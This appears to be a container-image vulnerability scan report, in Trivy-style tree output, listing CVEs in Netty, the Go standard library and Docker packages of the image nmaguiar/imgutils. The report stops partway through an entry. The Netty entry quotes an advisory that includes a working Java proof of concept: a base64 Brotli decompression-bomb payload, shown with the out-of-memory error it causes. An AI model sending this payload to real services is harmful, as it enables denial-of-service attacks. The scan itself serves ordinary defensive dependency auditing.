````yaml
╭ [0] ╭ Target: nmaguiar/imgutils:build (alpine 3.23.0_alpha20250612) 
│     ├ Class : os-pkgs 
│     ╰ Type  : alpine 
├ [1] ╭ Target         : Java 
│     ├ Class          : lang-pkgs 
│     ├ Type           : jar 
│     ╰ Vulnerabilities ─ [0] ╭ VulnerabilityID : CVE-2025-58057 
│                             ├ PkgName         : io.netty:netty-codec 
│                             ├ PkgPath         : openaf/Kube/netty-codec-4.1.124.Final.jar 
│                             ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec@4.1.124.Final 
│                             │                  ╰ UID : 49244db0421ffc41 
│                             ├ InstalledVersion: 4.1.124.Final 
│                             ├ FixedVersion    : 4.1.125.Final 
│                             ├ Status          : fixed 
│                             ├ Layer            ╭ Digest: sha256:c0959bad9720892bf785e51d3e640bea317084dc7279a
│                             │                  │         9a2e862e2b8cf782174 
│                             │                  ╰ DiffID: sha256:013f8762bd2ffae4f3afb3877069fccdd92c14e304b34
│                             │                            b5167a289ac82c12925 
│                             ├ SeveritySource  : ghsa 
│                             ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-58057 
│                             ├ DataSource       ╭ ID  : ghsa 
│                             │                  ├ Name: GitHub Security Advisory Maven 
│                             │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                             │                          osystem%3Amaven 
│                             ├ Title           : Netty's decoders vulnerable to DoS via zip bomb style attack 
│                             ├ Description     : ### Summary
│                             │                   
│                             │                   With specially crafted input, `BrotliDecoder` and some other
│                             │                   decompressing decoders will allocate a large number of
│                             │                   reachable byte buffers, which can lead to denial of service.
│                             │                   ### Details
│                             │                   `BrotliDecoder.decompress` has no limit in how often it calls
│                             │                    `pull`, decompressing data 64K bytes at a time. The buffers
│                             │                   are saved in the output list, and remain reachable until OOM
│                             │                   is hit. This is basically a zip bomb.
│                             │                   Tested on 4.1.118, but there were no changes to the decoder
│                             │                   since.
│                             │                   ### PoC
│                             │                   Run this test case with `-Xmx1G`:
│                             │                   ```java
│                             │                   import io.netty.buffer.Unpooled;
│                             │                   import io.netty.channel.embedded.EmbeddedChannel;
│                             │                   import java.util.Base64;
│                             │                   public class T {
│                             │                       public static void main(String[] args) {
│                             │                           EmbeddedChannel channel = new EmbeddedChannel(new
│                             │                   BrotliDecoder());
│                             │                          
│                             │                   channel.writeInbound(Unpooled.wrappedBuffer(Base64.getDecoder
│                             │                   ().decode("aPpxD1tETigSAGj6cQ8vRE4oEgBo+nEPW0ROKBIAaPpxD1tETi
│                             │                   gSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nE
│                             │                   PW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigS
│                             │                   AGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW
│                             │                   0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAG
│                             │                   j6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0R
│                             │                   OKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6
│                             │                   cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROK
│                             │                   BIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ
│                             │                   9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBI
│                             │                   AaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9b
│                             │                   RE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAa
│                             │                   PpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE
│                             │                   4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPp
│                             │                   xD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4o
│                             │                   EgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD
│                             │                   1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEg
│                             │                   Bo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1t
│                             │                   ETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo
│                             │                   +nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tET
│                             │                   igSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+n
│                             │                   EPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETig
│                             │                   SAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEP
│                             │                   W0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSA
│                             │                   Gj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0
│                             │                   ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj
│                             │                   6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0RO
│                             │                   KBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6c
│                             │                   Q9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKB
│                             │                   IAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9
│                             │                   bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIA
│                             │                   aPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bR
│                             │                   E4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROMBIAEg
│                             │                   IaHwBETlQQVFcXlgA=")));
│                             │                       }
│                             │                   }
│                             │                   ```
│                             │                   Error:
│                             │                   Exception in thread "main" java.lang.OutOfMemoryError: Cannot
│                             │                    reserve 4194304 bytes of direct buffer memory (allocated:
│                             │                   1069580289, limit: 1073741824)
│                             │                   	at java.base/java.nio.Bits.reserveMemory(Bits.java:178)
│                             │                   	at
│                             │                   java.base/java.nio.DirectByteBuffer.<init>(DirectByteBuffer.j
│                             │                   ava:121)
│                             │                   java.base/java.nio.ByteBuffer.allocateDirect(ByteBuffer.java:
│                             │                   332)
│                             │                   io.netty.buffer.PoolArena$DirectArena.allocateDirect(PoolAren
│                             │                   a.java:718)
│                             │                   io.netty.buffer.PoolArena$DirectArena.newChunk(PoolArena.java
│                             │                   :693)
│                             │                   io.netty.buffer.PoolArena.allocateNormal(PoolArena.java:213)
│                             │                   io.netty.buffer.PoolArena.tcacheAllocateNormal(PoolArena.java
│                             │                   :195)
│                             │                   	at io.netty.buffer.PoolArena.allocate(PoolArena.java:137)
│                             │                   	at io.netty.buffer.PoolArena.allocate(PoolArena.java:127)
│                             │                   io.netty.buffer.PooledByteBufAllocator.newDirectBuffer(Pooled
│                             │                   ByteBufAllocator.java:403)
│                             │                   io.netty.buffer.AbstractByteBufAllocator.directBuffer(Abstrac
│                             │                   tByteBufAllocator.java:188)
│                             │                   tByteBufAllocator.java:179)
│                             │                   io.netty.buffer.AbstractByteBufAllocator.buffer(AbstractByteB
│                             │                   ufAllocator.java:116)
│                             │                   io.netty.handler.codec.compression.BrotliDecoder.pull(BrotliD
│                             │                   ecoder.java:70)
│                             │                   io.netty.handler.codec.compression.BrotliDecoder.decompress(B
│                             │                   rotliDecoder.java:101)
│                             │                   io.netty.handler.codec.compression.BrotliDecoder.decode(Brotl
│                             │                   iDecoder.java:137)
│                             │                   io.netty.handler.codec.ByteToMessageDecoder.decodeRemovalReen
│                             │                   tryProtection(ByteToMessageDecoder.java:530)
│                             │                   io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteTo
│                             │                   MessageDecoder.java:469)
│                             │                   io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteT
│                             │                   oMessageDecoder.java:290)
│                             │                   io.netty.channel.AbstractChannelHandlerContext.invokeChannelR
│                             │                   ead(AbstractChannelHandlerContext.java:444)
│                             │                   ead(AbstractChannelHandlerContext.java:420)
│                             │                   io.netty.channel.AbstractChannelHandlerContext.fireChannelRea
│                             │                   d(AbstractChannelHandlerContext.java:412)
│                             │                   io.netty.channel.DefaultChannelPipeline$HeadContext.channelRe
│                             │                   ad(DefaultChannelPipeline.java:1357)
│                             │                   ead(AbstractChannelHandlerContext.java:440)
│                             │                   io.netty.channel.DefaultChannelPipeline.fireChannelRead(Defau
│                             │                   ltChannelPipeline.java:868)
│                             │                   io.netty.channel.embedded.EmbeddedChannel.writeInbound(Embedd
│                             │                   edChannel.java:348)
│                             │                   	at io.netty.handler.codec.compression.T.main(T.java:11)
│                             │                   ### Impact
│                             │                   DoS for anyone using `BrotliDecoder` on untrusted input. 
│                             ├ Severity        : MEDIUM 
│                             ├ VendorSeverity   ─ ghsa: 2 
│                             ╰ References       ╭ [0]: https://github.com/netty/netty 
│                                                ├ [1]: https://github.com/netty/netty/commit/9d804c54ce962408a
│                                                │      e6418255a83a13924f7145d 
│                                                ╰ [2]: https://github.com/netty/netty/security/advisories/GHSA
│                                                       -3p8m-j85q-pgmj 
├ [2] ╭ Target         : usr/bin/crictl 
│     ├ Class          : lang-pkgs 
│     ├ Type           : gobinary 
│     ╰ Vulnerabilities ╭ [0] ╭ VulnerabilityID : CVE-2025-22874 
│                       │     ├ PkgID           : stdlib@v1.24.1 
│                       │     ├ PkgName         : stdlib 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.1 
│                       │     │                  ╰ UID : 969259d6a3318a6c 
│                       │     ├ InstalledVersion: v1.24.1 
│                       │     ├ FixedVersion    : 1.24.4 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:c0959bad9720892bf785e51d3e640bea317084dc7279a
│                       │     │                  │         9a2e862e2b8cf782174 
│                       │     │                  ╰ DiffID: sha256:013f8762bd2ffae4f3afb3877069fccdd92c14e304b34
│                       │     │                            b5167a289ac82c12925 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-22874 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Title           : crypto/x509: Usage of ExtKeyUsageAny disables policy
│                       │     │                   validation in crypto/x509 
│                       │     ├ Description     : Calling Verify with a VerifyOptions.KeyUsages that contains
│                       │     │                   ExtKeyUsageAny unintentionally disabledpolicy validation.
│                       │     │                   This only affected certificate chains which contain policy
│                       │     │                   graphs, which are rather uncommon. 
│                       │     ├ Severity        : HIGH 
│                       │     ├ VendorSeverity   ╭ amazon     : 2 
│                       │     │                  ├ bitnami    : 3 
│                       │     │                  ├ cbl-mariner: 3 
│                       │     │                  ╰ redhat     : 3 
│                       │     ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H
│                       │     │                  │         │           /A:N 
│                       │     │                  │         ╰ V3Score : 7.5 
│                       │     │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H
│                       │     │                            │           /A:N 
│                       │     │                            ╰ V3Score : 7.5 
│                       │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2025-22874 
│                       │     │                  ├ [1]: https://go.dev/cl/670375 
│                       │     │                  ├ [2]: https://go.dev/issue/73612 
│                       │     │                  ├ [3]: https://groups.google.com/g/golang-announce/c/ufZ8WpEsA3A 
│                       │     │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2025-22874 
│                       │     │                  ├ [5]: https://pkg.go.dev/vuln/GO-2025-3749 
│                       │     │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2025-22874 
│                       │     ├ PublishedDate   : 2025-06-11T17:15:42.167Z 
│                       │     ╰ LastModifiedDate: 2025-06-12T16:06:20.18Z 
│                       ├ [1] ╭ VulnerabilityID : CVE-2025-47907 
│                       │     ├ PkgID           : stdlib@v1.24.1 
│                       │     ├ PkgName         : stdlib 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.1 
│                       │     │                  ╰ UID : 969259d6a3318a6c 
│                       │     ├ InstalledVersion: v1.24.1 
│                       │     ├ FixedVersion    : 1.23.12, 1.24.6 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:c0959bad9720892bf785e51d3e640bea317084dc7279a
│                       │     │                  │         9a2e862e2b8cf782174 
│                       │     │                  ╰ DiffID: sha256:013f8762bd2ffae4f3afb3877069fccdd92c14e304b34
│                       │     │                            b5167a289ac82c12925 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-47907 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Title           : database/sql: Postgres Scan Race Condition 
│                       │     ├ Description     : Cancelling a query (e.g. by cancelling the context passed to
│                       │     │                   one of the query methods) during a call to the Scan method of
│                       │     │                    the returned Rows can result in unexpected results if other
│                       │     │                   queries are being made in parallel. This can result in a race
│                       │     │                    condition that may overwrite the expected results with those
│                       │     │                    of another query, causing the call to Scan to return either
│                       │     │                   unexpected results from the other query or an error. 
│                       │     ├ Severity        : HIGH 
│                       │     ├ VendorSeverity   ╭ azure  : 3 
│                       │     │                  ├ bitnami: 3 
│                       │     │                  ╰ redhat : 3 
│                       │     ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L
│                       │     │                  │         │           /A:L 
│                       │     │                  │         ╰ V3Score : 7 
│                       │     │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L
│                       │     │                            │           /A:L 
│                       │     │                            ╰ V3Score : 7 
│                       │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2025-47907 
│                       │     │                  ├ [1]: https://go.dev/cl/693735 
│                       │     │                  ├ [2]: https://go.dev/issue/74831 
│                       │     │                  ├ [3]: https://groups.google.com/g/golang-announce/c/x5MKroML2yM 
│                       │     │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2025-47907 
│                       │     │                  ├ [5]: https://pkg.go.dev/vuln/GO-2025-3849 
│                       │     │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2025-47907 
│                       │     ├ PublishedDate   : 2025-08-07T16:15:30.357Z 
│                       │     ╰ LastModifiedDate: 2025-08-07T21:26:37.453Z 
│                       ├ [2] ╭ VulnerabilityID : CVE-2025-0913 
│                       │     ├ PkgID           : stdlib@v1.24.1 
│                       │     ├ PkgName         : stdlib 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.1 
│                       │     │                  ╰ UID : 969259d6a3318a6c 
│                       │     ├ InstalledVersion: v1.24.1 
│                       │     ├ FixedVersion    : 1.23.10, 1.24.4 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:c0959bad9720892bf785e51d3e640bea317084dc7279a
│                       │     │                  │         9a2e862e2b8cf782174 
│                       │     │                  ╰ DiffID: sha256:013f8762bd2ffae4f3afb3877069fccdd92c14e304b34
│                       │     │                            b5167a289ac82c12925 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-0913 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Title           : Inconsistent handling of O_CREATE|O_EXCL on Unix and Windows
│                       │     │                   in os in syscall 
│                       │     ├ Description     : os.OpenFile(path, os.O_CREATE|O_EXCL) behaved differently on
│                       │     │                   Unix and Windows systems when the target path was a dangling
│                       │     │                   symlink. On Unix systems, OpenFile with O_CREATE and O_EXCL
│                       │     │                   flags never follows symlinks. On Windows, when the target
│                       │     │                   path was a symlink to a nonexistent location, OpenFile would
│                       │     │                   create a file in that location. OpenFile now always returns
│                       │     │                   an error when the O_CREATE and O_EXCL flags are both set and
│                       │     │                   the target path is a symlink. 
│                       │     ├ Severity        : MEDIUM 
│                       │     ├ CweIDs           ─ [0]: CWE-59 
│                       │     ├ VendorSeverity   ─ bitnami: 2 
│                       │     ├ CVSS             ─ bitnami ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H
│                       │     │                            │           /A:N 
│                       │     │                            ╰ V3Score : 5.5 
│                       │     ├ References       ╭ [0]: https://go.dev/cl/672396 
│                       │     │                  ├ [1]: https://go.dev/issue/73702 
│                       │     │                  ├ [2]: https://groups.google.com/g/golang-announce/c/ufZ8WpEsA3A 
│                       │     │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2025-0913 
│                       │     │                  ╰ [4]: https://pkg.go.dev/vuln/GO-2025-3750 
│                       │     ├ PublishedDate   : 2025-06-11T18:15:24.627Z 
│                       │     ╰ LastModifiedDate: 2025-08-08T14:53:03.55Z 
│                       ├ [3] ╭ VulnerabilityID : CVE-2025-22871 
│                       │     ├ PkgID           : stdlib@v1.24.1 
│                       │     ├ PkgName         : stdlib 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.1 
│                       │     │                  ╰ UID : 969259d6a3318a6c 
│                       │     ├ InstalledVersion: v1.24.1 
│                       │     ├ FixedVersion    : 1.23.8, 1.24.2 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:c0959bad9720892bf785e51d3e640bea317084dc7279a
│                       │     │                  │         9a2e862e2b8cf782174 
│                       │     │                  ╰ DiffID: sha256:013f8762bd2ffae4f3afb3877069fccdd92c14e304b34
│                       │     │                            b5167a289ac82c12925 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-22871 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Title           : net/http: Request smuggling due to acceptance of invalid
│                       │     │                   chunked data in net/http 
│                       │     ├ Description     : The net/http package improperly accepts a bare LF as a line
│                       │     │                   terminator in chunked data chunk-size lines. This can permit
│                       │     │                   request smuggling if a net/http server is used in conjunction
│                       │     │                    with a server that incorrectly accepts a bare LF as part of
│                       │     │                   a chunk-ext. 
│                       │     ├ Severity        : MEDIUM 
│                       │     ├ VendorSeverity   ╭ alma       : 2 
│                       │     │                  ├ amazon     : 3 
│                       │     │                  ├ bitnami    : 4 
│                       │     │                  ├ cbl-mariner: 3 
│                       │     │                  ├ oracle-oval: 2 
│                       │     │                  ├ redhat     : 2 
│                       │     │                  ╰ rocky      : 2 
│                       │     ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H
│                       │     │                  │         │           /A:N 
│                       │     │                  │         ╰ V3Score : 9.1 
│                       │     │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L
│                       │     │                            │           /A:N 
│                       │     │                            ╰ V3Score : 5.4 
│                       │     ├ References       ╭ [0] : http://www.openwall.com/lists/oss-security/2025/04/04/4 
│                       │     │                  ├ [1] : https://access.redhat.com/errata/RHSA-2025:9635 
│                       │     │                  ├ [2] : https://access.redhat.com/security/cve/CVE-2025-22871 
│                       │     │                  ├ [3] : https://bugzilla.redhat.com/2358493 
│                       │     │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2358493 
│                       │     │                  ├ [5] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-202
│                       │     │                  │       5-22871 
│                       │     │                  ├ [6] : https://errata.almalinux.org/9/ALSA-2025-9635.html 
│                       │     │                  ├ [7] : https://errata.rockylinux.org/RLSA-2025:9845 
│                       │     │                  ├ [8] : https://go.dev/cl/652998 
│                       │     │                  ├ [9] : https://go.dev/issue/71988 
│                       │     │                  ├ [10]: https://groups.google.com/g/golang-announce/c/Y2uBTVKj
│                       │     │                  │       BQk 
│                       │     │                  ├ [11]: https://linux.oracle.com/cve/CVE-2025-22871.html 
│                       │     │                  ├ [12]: https://linux.oracle.com/errata/ELSA-2025-9845.html 
│                       │     │                  ├ [13]: https://nvd.nist.gov/vuln/detail/CVE-2025-22871 
│                       │     │                  ├ [14]: https://pkg.go.dev/vuln/GO-2025-3563 
│                       │     │                  ╰ [15]: https://www.cve.org/CVERecord?id=CVE-2025-22871 
│                       │     ├ PublishedDate   : 2025-04-08T20:15:20.183Z 
│                       │     ╰ LastModifiedDate: 2025-04-18T15:15:57.923Z 
│                       ╰ [4] ╭ VulnerabilityID : CVE-2025-4673 
│                             ├ PkgID           : stdlib@v1.24.1 
│                             ├ PkgName         : stdlib 
│                             ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.1 
│                             │                  ╰ UID : 969259d6a3318a6c 
│                             ├ InstalledVersion: v1.24.1 
│                             ├ FixedVersion    : 1.23.10, 1.24.4 
│                             ├ Status          : fixed 
│                             ├ Layer            ╭ Digest: sha256:c0959bad9720892bf785e51d3e640bea317084dc7279a
│                             │                  │         9a2e862e2b8cf782174 
│                             │                  ╰ DiffID: sha256:013f8762bd2ffae4f3afb3877069fccdd92c14e304b34
│                             │                            b5167a289ac82c12925 
│                             ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-4673 
│                             ├ DataSource       ╭ ID  : govulndb 
│                             │                  ├ Name: The Go Vulnerability Database 
│                             │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                             ├ Title           : net/http: Sensitive headers not cleared on cross-origin
│                             │                   redirect in net/http 
│                             ├ Description     : Proxy-Authorization and Proxy-Authenticate headers persisted
│                             │                   on cross-origin redirects potentially leaking sensitive
│                             │                   information. 
│                             ├ Severity        : MEDIUM 
│                             ├ VendorSeverity   ╭ alma       : 2 
│                             │                  ├ amazon     : 2 
│                             │                  ├ azure      : 2 
│                             │                  ├ bitnami    : 2 
│                             │                  ├ cbl-mariner: 2 
│                             │                  ├ oracle-oval: 2 
│                             │                  ├ redhat     : 2 
│                             │                  ╰ ubuntu     : 2 
│                             ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N
│                             │                  │         │           /A:N 
│                             │                  │         ╰ V3Score : 6.8 
│                             │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N
│                             │                            │           /A:N 
│                             │                            ╰ V3Score : 6.8 
│                             ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2025:10676 
│                             │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2025-4673 
│                             │                  ├ [2] : https://bugzilla.redhat.com/2373305 
│                             │                  ├ [3] : https://errata.almalinux.org/9/ALSA-2025-10676.html 
│                             │                  ├ [4] : https://go.dev/cl/679257 
│                             │                  ├ [5] : https://go.dev/issue/73816 
│                             │                  ├ [6] : https://groups.google.com/g/golang-announce/c/ufZ8WpEs
│                             │                  │       A3A 
│                             │                  ├ [7] : https://linux.oracle.com/cve/CVE-2025-4673.html 
│                             │                  ├ [8] : https://linux.oracle.com/errata/ELSA-2025-10677.html 
│                             │                  ├ [9] : https://nvd.nist.gov/vuln/detail/CVE-2025-4673 
│                             │                  ├ [10]: https://pkg.go.dev/vuln/GO-2025-3751 
│                             │                  ├ [11]: https://ubuntu.com/security/notices/USN-7574-1 
│                             │                  ╰ [12]: https://www.cve.org/CVERecord?id=CVE-2025-4673 
│                             ├ PublishedDate   : 2025-06-11T17:15:42.993Z 
│                             ╰ LastModifiedDate: 2025-06-12T16:06:20.18Z 
├ [3] ╭ Target: usr/bin/ctr 
│     ├ Class : lang-pkgs 
│     ╰ Type  : gobinary 
├ [4] ╭ Target         : usr/bin/dive 
│     ├ Class          : lang-pkgs 
│     ├ Type           : gobinary 
│     ╰ Vulnerabilities ╭ [0] ╭ VulnerabilityID : CVE-2025-54410 
│                       │     ├ PkgID           : github.com/docker/docker@v27.1.2+incompatible 
│                       │     ├ PkgName         : github.com/docker/docker 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/docker@v27.1.2%2Bincompat
│                       │     │                  │       ible 
│                       │     │                  ╰ UID : 92dfc7b3a5de6e88 
│                       │     ├ InstalledVersion: v27.1.2+incompatible 
│                       │     ├ FixedVersion    : 28.0.0 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:c0959bad9720892bf785e51d3e640bea317084dc7279a
│                       │     │                  │         9a2e862e2b8cf782174 
│                       │     │                  ╰ DiffID: sha256:013f8762bd2ffae4f3afb3877069fccdd92c14e304b34
│                       │     │                            b5167a289ac82c12925 
│                       │     ├ SeveritySource  : ghsa 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-54410 
│                       │     ├ DataSource       ╭ ID  : ghsa 
│                       │     │                  ├ Name: GitHub Security Advisory Go 
│                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                       │     │                          osystem%3Ago 
│                       │     ├ Title           : github.com/moby/moby: Moby's Firewalld reload removes bridge
│                       │     │                   network isolation 
│                       │     ├ Description     : Moby is an open source container framework developed by
│                       │     │                   Docker Inc. that is distributed as Docker Engine, Mirantis
│                       │     │                   Container Runtime, and various other downstream
│                       │     │                   projects/products. A firewalld vulnerability affects Moby
│                       │     │                   releases before 28.0.0. When firewalld reloads, Docker fails
│                       │     │                   to re-create iptables rules that isolate bridge networks,
│                       │     │                   allowing any container to access all ports on any other
│                       │     │                   container across different bridge networks on the same host.
│                       │     │                   This breaks network segmentation between containers that
│                       │     │                   should be isolated, creating significant risk in multi-tenant
│                       │     │                    environments. Only containers in --internal networks remain
│                       │     │                   protected.
│                       │     │                   Workarounds include reloading firewalld and either restarting
│                       │     │                    the docker daemon, re-creating bridge networks, or using
│                       │     │                   rootless mode. Maintainers anticipate a fix for this issue in
│                       │     │                    version 25.0.13. 
│                       │     ├ Severity        : LOW 
│                       │     ├ CweIDs           ─ [0]: CWE-909 
│                       │     ├ VendorSeverity   ╭ ghsa  : 1 
│                       │     │                  ├ nvd   : 2 
│                       │     │                  ╰ redhat: 1 
│                       │     ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:L/I:L/
│                       │     │                  │        │           A:N 
│                       │     │                  │        ╰ V3Score : 3.3 
│                       │     │                  ├ nvd    ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:L/I:L/
│                       │     │                  │        │           A:N 
│                       │     │                  │        ╰ V3Score : 5.2 
│                       │     │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:L/I:L/
│                       │     │                           │           A:N 
│                       │     │                           ╰ V3Score : 3.3 
│                       │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2025-54410 
│                       │     │                  ├ [1]: https://firewalld.org/documentation/howto/reload-firewa
│                       │     │                  │      lld.html 
│                       │     │                  ├ [2]: https://github.com/moby/moby 
│                       │     │                  ├ [3]: https://github.com/moby/moby/pull/49443 
│                       │     │                  ├ [4]: https://github.com/moby/moby/pull/49728 
│                       │     │                  ├ [5]: https://github.com/moby/moby/security/advisories/GHSA-4
│                       │     │                  │      vq8-7jfc-9cvp 
│                       │     │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2025-54410 
│                       │     │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2025-54410 
│                       │     ├ PublishedDate   : 2025-07-30T14:15:28.9Z 
│                       │     ╰ LastModifiedDate: 2025-08-22T17:27:29.677Z 
│                       ├ [1] ╭ VulnerabilityID : CVE-2025-22870 
│                       │     ├ PkgID           : golang.org/x/net@v0.28.0 
│                       │     ├ PkgName         : golang.org/x/net 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.28.0 
│                       │     │                  ╰ UID : 2fe24708cb92b4b0 
│                       │     ├ InstalledVersion: v0.28.0 
│                       │     ├ FixedVersion    : 0.36.0 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:c0959bad9720892bf785e51d3e640bea317084dc7279a
│                       │     │                  │         9a2e862e2b8cf782174 
